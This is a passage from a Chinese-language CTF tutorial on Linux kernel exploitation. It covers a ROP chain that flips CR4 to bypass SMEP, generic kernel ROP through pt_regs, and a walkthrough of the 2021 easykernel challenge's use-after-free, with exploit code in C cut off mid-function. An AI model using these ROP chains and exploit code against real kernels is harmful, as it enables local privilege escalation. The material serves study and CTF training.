MOV_RAX_CR4_ADD_RSP_8_POP_RBP_RET + offset;</span><br><span class="line">    rop_chain[i++] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[i++] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[i++] = POP_RDI_RET + offset;</span><br><span class="line">    rop_chain[i++] = <span class="number">0xffffffffffcfffff</span>;</span><br><span class="line">    rop_chain[i++] = AND_RAX_RDI_RET + offset;</span><br><span class="line">    rop_chain[i++] = MOV_CR4_RAX_PUSH_RCX_POPFQ_RET + offset;<span class="comment">//改变cr4</span></span><br><span class="line">    rop_chain[i++] = (<span class="type">size_t</span>)getRootPrivilige;</span><br><span class="line">    rop_chain[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span> + offset;</span><br><span class="line">    rop_chain[i++] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[i++] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[i++] = (<span class="type">size_t</span>)getRootShell;</span><br><span class="line">    rop_chain[i++] = user_cs;</span><br><span class="line">    rop_chain[i++] = user_rflags;</span><br><span class="line">    rop_chain[i++] = user_sp;</span><br><span class="line">    rop_chain[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop_chain, <span class="number">0x800</span>);</span><br><span class="line">    coreCopyFunc(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用-pt-regs-构造通用内核-ROP"><a href="#利用-pt-regs-构造通用内核-ROP" class="headerlink" title="利用 pt_regs 构造通用内核 ROP"></a>利用 pt_regs 构造通用内核 ROP</h2><h3 id="系统调用-与-pt-regs-结构体"><a href="#系统调用-与-pt-regs-结构体" class="headerlink" title="系统调用 与 pt_regs 结构体"></a>系统调用 与 pt_regs 结构体</h3><p>系统调用的本质是什么？或许不少人都能够答得上来是由我们在用户态布置好相应的参数后执行 <code>syscall</code> 这一汇编指令，通过门结构进入到内核中的 <code>entry_SYSCALL_64</code>这一函数，随后通过系统调用表跳转到对应的函数。</p><p>现在让我们将目光放到 <code>entry_SYSCALL_64</code> 这一用汇编写的函数内部，注意到当程序进入到内核态时，该函数会将所有的寄存器<strong>压入内核栈上，形成一个 pt_regs 结构体</strong>，该结构体实质上位于内核栈底，定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//r15, r14, r13, r12, rbp, rbx 是 callee-preserved 寄存器。在 Linux 内核中，当一个 syscall 不需要完整的、充分填充的 struct pt_regs 时，这些寄存器的内容在内核入口时不会被保存。也就是说，它们的值不会在每次进入内核时保存，而只在必要时才会保存。</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line"><span class="comment">//总会被保存</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="内核栈-与通用-ROP"><a href="#内核栈-与通用-ROP" class="headerlink" title="内核栈 与通用 ROP"></a>内核栈 与通用 ROP</h3><p>每个进程都有一个对应的独立的内核栈。内核栈是用于处理进程在内核模式下执行时的函数调用和中断处理的空间。每个进程都有一个独立的内核栈，这样可以确保在进程切换时，每个进程都有自己的内核栈，不会相互干扰。</p><p><strong>内核栈的大小是固定的一个页面的大小(4kb)</strong>，而 pt_regs 结构体则固定位于<strong>内核栈栈底</strong>，当我们劫持内核结构体中的某个函数指针时（例如 <u>seq_operations-&gt;start</u>），在我们通过该函数指针劫持内核执行流时 <strong>rsp 与 栈底的相对偏移通常是不变的</strong>。</p><p>而在系统调用当中过程有很多的寄存器其实是不一定能用上的，比如 r8 ~ r15，<strong>这些寄存器为我们布置 ROP 链提供了可能，我们不难想到：</strong></p><ul><li><strong>只需要寻找到一条形如 “add rsp, val ; ret” 的 gadget 便能够完成 ROP</strong></li></ul><p>这里笔者给出一个通用的 ROP 板子，方便调试时观察：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">    &quot;mov r15,   0xbeefdead;&quot;</span><br><span class="line">    &quot;mov r14,   0x11111111;&quot;</span><br><span class="line">    &quot;mov r13,   0x22222222;&quot;</span><br><span class="line">    &quot;mov r12,   0x33333333;&quot;</span><br><span class="line">    &quot;mov rbp,   0x44444444;&quot;</span><br><span class="line">    &quot;mov rbx,   0x55555555;&quot;</span><br><span class="line">    &quot;mov r11,   0x66666666;&quot;</span><br><span class="line">    &quot;mov r10,   0x77777777;&quot;</span><br><span class="line">    &quot;mov r9,    0x88888888;&quot;</span><br><span class="line">    &quot;mov r8,    0x99999999;&quot;</span><br><span class="line">    &quot;xor rax,   rax;&quot;</span><br><span class="line">    &quot;mov rcx,   0xaaaaaaaa;&quot;</span><br><span class="line">    &quot;mov rdx,   8;&quot;</span><br><span class="line">    &quot;mov rsi,   rsp;&quot;</span><br><span class="line">    &quot;mov rdi,   seq_fd;&quot;        // 这里假定通过 seq_operations-&gt;stat 来触发</span><br><span class="line">    &quot;syscall&quot;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="新版本内核对抗利用-pt-regs-进行攻击的办法"><a href="#新版本内核对抗利用-pt-regs-进行攻击的办法" class="headerlink" title="新版本内核对抗利用 pt_regs 进行攻击的办法"></a>新版本内核对抗利用 pt_regs 进行攻击的办法</h3><p>正所谓魔高一尺道高一丈，内核主线在 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=eea2647e74cd7bd5d04861ce55fa502de165de14">这个 commit</a> 中为系统调用栈<strong>添加了一个偏移值，这意味着 pt_regs 与我们触发劫持内核执行流时的栈间偏移值不再是固定值</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/arch/x86/entry/common.c b/arch/x86/entry/common.c</span><br><span class="line">index <span class="number">4</span>efd39aacb9f2.<span class="number">.7</span>b2542b13ebd9 <span class="number">100644</span></span><br><span class="line">--- a/arch/x86/entry/common.c</span><br><span class="line">+++ b/arch/x86/entry/common.c</span><br><span class="line">@@ <span class="number">-38</span>,<span class="number">6</span> +<span class="number">38</span>,<span class="number">7</span> @@</span><br><span class="line"> <span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_64</span></span><br><span class="line"> __visible noinstr <span class="type">void</span> <span class="title function_">do_syscall_64</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> nr, <span class="keyword">struct</span> pt_regs *regs)</span></span><br><span class="line"> &#123;</span><br><span class="line">+    add_random_kstack_offset();</span><br><span class="line">     nr = syscall_enter_from_user_mode(regs, nr);</span><br><span class="line"></span><br><span class="line">     instrumentation_begin();</span><br></pre></td></tr></table></figure><p>当然，若是在这个随机偏移值较小且我们仍有足够多的寄存器可用的情况下，仍然可以通过布置一些 slide gadget 来继续完成利用，不过稳定性也大幅下降了。</p><h3 id="例题：西湖论剑-2021-线上初赛-easykernel"><a href="#例题：西湖论剑-2021-线上初赛-easykernel" class="headerlink" title="例题：西湖论剑 2021 线上初赛 - easykernel"></a>例题：西湖论剑 2021 线上初赛 - easykernel</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>首先查看启动脚本，可以发现开启了 SMEP 和 KASLR：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">qemu-system-x86_64  \</span><br><span class="line">-m 64M \</span><br><span class="line">-cpu kvm64,+smep \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd rootfs.img \</span><br><span class="line">-nographic \</span><br><span class="line">-s \</span><br><span class="line">-append &quot;console=ttyS0 kaslr quiet noapic&quot;</span><br></pre></td></tr></table></figure><p>进入题目环境，查看 <code>/sys/devices/system/cpu/vulnerabilities/*</code>，可以发现开启了 PTI （页表隔离）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /sys/devices/system/cpu/vulnerabilities/*</span><br><span class="line">KVM: Mitigation: VMX unsupported</span><br><span class="line">Mitigation: PTE Inversion</span><br><span class="line">Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown</span><br><span class="line">Mitigation: PTI</span><br><span class="line">Vulnerable</span><br><span class="line">Mitigation: usercopy/swapgs barriers and __user pointer sanitization</span><br><span class="line">Mitigation: Full generic retpoline, STIBP: disabled, RSB filling</span><br><span class="line">Not affected</span><br><span class="line">Not affected</span><br></pre></td></tr></table></figure><p>题目给了个 test.ko，拖入 IDA 进行分析，发现只定义了 ioctl，可以看出是常见的 “菜单堆” 题目，给出了分配、释放、读、写 object 的功能。对于分配 object，我们需要传入如下形式结构体：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct</span><br><span class="line">&#123;</span><br><span class="line">    size_t size;</span><br><span class="line">    void *buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于释放、读、写 object，则需要传入如下形式结构体：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct </span><br><span class="line">&#123;</span><br><span class="line">    size_t idx;</span><br><span class="line">    size_t size;</span><br><span class="line">    void *buf;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="分配：0x20"><a href="#分配：0x20" class="headerlink" title="分配：0x20"></a>分配：0x20</h5><p>比较常规的 kmalloc，没有限制 size，最多可以分配 0x20 个 chunk：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> v7 = _kmalloc(v12, 3264LL);</span><br><span class="line">  v8 = v7;</span><br><span class="line">  if ( !v7 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  v9 = v12;</span><br><span class="line">  v10 = v13;</span><br><span class="line">  if ( v12 &gt; 0x7FFFFFFF )</span><br><span class="line">    goto LABEL_29;</span><br><span class="line">  _check_object_size(v7, v12, 0LL);</span><br><span class="line">  v11 = copy_from_user(v8, v10, v9);</span><br><span class="line">  if ( v11 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  while ( addrList[v11] )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( ++v11 == 32 )</span><br><span class="line">      return 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  addrList[(int)v11] = v8;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="释放：0x30"><a href="#释放：0x30" class="headerlink" title="释放：0x30"></a>释放：0x30</h5><p><strong>kfree 以后没有清空指针，直接就有一个裸的 UAF 糊脸</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if ( a2 != 32 )</span><br><span class="line">&#123;</span><br><span class="line">  if ( a2 != 48 )</span><br><span class="line">    return result;</span><br><span class="line">  if ( !copy_from_user(&amp;v12, v2, 8LL) )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( (unsigned int)v12 &lt;= 0x20 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( addrList[(unsigned int)v12] )</span><br><span class="line">        kfree();</span><br><span class="line">    &#125;</span><br><span class="line">    return 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return -22LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="读：0x40"><a href="#读：0x40" class="headerlink" title="读：0x40"></a>读：0x40</h5><p>会调用 show 函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if ( a2 == 64 )</span><br><span class="line">&#123;</span><br><span class="line">  if ( !copy_from_user(&amp;v12, v2, 24LL) )</span><br><span class="line">  &#123;</span><br><span class="line">    show(&amp;v12);</span><br><span class="line">    return 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return -22LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实就是套了一层皮的读 object 内容，加了 hardened usercopy 检查：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall show(_QWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">  const void *v1; // rsi</span><br><span class="line">  unsigned __int64 v2; // r13</span><br><span class="line">  __int64 v3; // r14</span><br><span class="line">  _QWORD v5[37]; // [rsp-128h] [rbp-128h] BYREF</span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v5[32] = __readgsqword(0x28u);</span><br><span class="line">  v5[0] = 0LL;</span><br><span class="line">  memset(&amp;v5[1], 0, 0xF8uLL);</span><br><span class="line">  if ( (unsigned int)*a1 &gt; 0x20 )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  v1 = (const void *)addrList[(unsigned int)*a1];</span><br><span class="line">  if ( !v1 )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  v2 = a1[1];</span><br><span class="line">  v3 = a1[2];</span><br><span class="line">  qmemcpy(v5, v1, 0x100uLL);</span><br><span class="line">  if ( v2 &gt; 0x100 )</span><br><span class="line">  &#123;</span><br><span class="line">    _warn_printk(&quot;Buffer overflow detected (%d &lt; %lu)!\n&quot;, 256LL, v2);</span><br><span class="line">    BUG();</span><br><span class="line">  &#125;</span><br><span class="line">  _check_object_size(v5, v2, 1LL);</span><br><span class="line">  return copy_to_user(v3, v5, v2) != 0 ? 0xFFFFFFEA : 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="写：0x50"><a href="#写：0x50" class="headerlink" title="写：0x50"></a>写：0x50</h5><p>常规的写入 object：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">  if ( a2 &gt; 0x40 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( a2 == 80 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( copy_from_user(&amp;v12, v2, 24LL) )</span><br><span class="line">        return -22LL;</span><br><span class="line">      if ( (unsigned int)v12 &lt;= 0x20 )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = addrList[(unsigned int)v12];</span><br><span class="line">        if ( v4 )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = v13;</span><br><span class="line">          v6 = v14;</span><br><span class="line">          if ( v13 &lt;= 0x7FFFFFFF )</span><br><span class="line">          &#123;</span><br><span class="line">            _check_object_size(addrList[(unsigned int)v12], v13, 0LL);</span><br><span class="line">            copy_from_user(v4, v6, v5);</span><br><span class="line">            return 0LL;</span><br><span class="line">          &#125;</span><br><span class="line">LABEL_29:</span><br><span class="line">          BUG();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0LL;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h4 id="解法：UAF-seq-operations-pt-regs-ROP"><a href="#解法：UAF-seq-operations-pt-regs-ROP" class="headerlink" title="解法：UAF + seq_operations + pt_regs + ROP"></a>解法：UAF + seq_operations + pt_regs + ROP</h4><p>题目没有说明，那笔者默认应该是没开 Hardened Freelist，现在又有 UAF，那么解法就是多种多样的了，笔者这里选择用 <code>seq_operations</code> + <code>pt_regs</code> 构造 ROP 进行提权：</p><p>exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810c8d40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEQ_OPS_0 0xffffffff81319d30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED 0xffffffff82663300</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff81089250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> dev_fd;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">op_chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span>  idx;</span><br><span class="line">    <span class="type">size_t</span>  size;</span><br><span class="line">    <span class="type">void</span>    *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span>  size;</span><br><span class="line">    <span class="type">void</span>    *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">readChunk</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">op_chunk</span> <span class="title">op</span> =</span> </span><br><span class="line">    &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0x40</span>, &amp;op);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">writeChunk</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">op_chunk</span> <span class="title">op</span> =</span> </span><br><span class="line">    &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0x50</span>, &amp;op);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">deleteChunk</span><span class="params">(<span class="type">size_t</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">op_chunk</span> <span class="title">op</span> =</span> </span><br><span class="line">    &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0x30</span>, &amp;op);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">allocChunk</span><span class="params">(<span class="type">size_t</span> size, <span class="type">void</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">alloc_chunk</span> <span class="title">alloc</span> =</span> </span><br><span class="line">    &#123;</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0x20</span>, &amp;alloc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span>      buf[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">size_t</span>      swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line"><span class="type">size_t</span>      init_cred;</span><br><span class="line"><span class="type">size_t</span>      pop_rdi_ret;</span><br><span class="line"><span class="type">long</span>        seq_fd;</span><br><span class="line"><span class="type">void</span> *      kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span>      kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span>      commit_creds;</span><br><span class="line"><span class="type">size_t</span>      gadget;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv, <span class="type">char</span> ** envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/kerpwn&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    allocChunk(<span class="number">0x20</span>, buf);</span><br><span class="line">    deleteChunk(<span class="number">0</span>);</span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    